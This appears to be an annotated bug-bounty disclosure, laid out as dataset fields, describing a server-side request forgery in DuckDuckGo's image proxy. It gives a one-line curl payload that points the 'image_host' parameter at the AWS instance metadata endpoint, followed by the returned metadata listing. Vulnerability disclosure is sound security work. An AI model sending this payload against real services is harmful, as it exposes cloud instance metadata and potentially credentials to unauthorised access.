title: SSRF vulnerability on proxy.duckduckgo.com (access to metadata server on AWS)
content:
Hello, I saw that SSRF on proxy.duckduckgo.com is out of scope but because of the severity I wanted to report this.
The payload is simple:
curl "https://proxy.duckduckgo.com/iur/?f=1&image_host=http://169.254.169.254/latest/meta-data/"
Response from the server:
Code 323 Bytes
1ami-launch-index
2ami-manifest-path
3block-device-mapping/
4hostname
5instance-action
6instance-id
7instance-type
8local-hostname
9local-ipv4
10mac
11metrics/
12network/
13placement/
14profile
15public-hostname
16public-ipv4
17public-keys/
18reservation-id
19security-groups
20services/```
21
22## Impact
23
24access information on internal AWS metadata server.
steps: Observe the response containing AWS metadata server information
vuln_description: The vulnerability is a Server-Side Request Forgery (SSRF) in the DuckDuckGo proxy service, allowing access to AWS metadata server information by manipulating the 'image_host' parameter to point to internal AWS endpoints.
reason: The attack is straightforward, involving only a single HTTP request with a well-known internal AWS endpoint. No complex interactions or state manipulations are required, and the technique is commonly known in security testing.
